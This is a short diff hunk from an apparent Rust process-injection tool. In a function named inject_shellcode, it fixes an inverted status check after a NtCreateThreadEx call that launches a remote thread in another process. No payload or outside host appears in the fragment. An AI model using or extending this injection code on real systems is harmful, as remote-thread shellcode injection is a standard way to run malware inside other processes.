@@ -87,7 +87,7 @@ fn inject_shellcode(process_id: Pid) {
 
         status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());
 
-        if NT_SUCCESS(status) {
+        if !NT_SUCCESS(status) {
             panic!("Error failed to create remote thread: {}", status);
         }
     }   
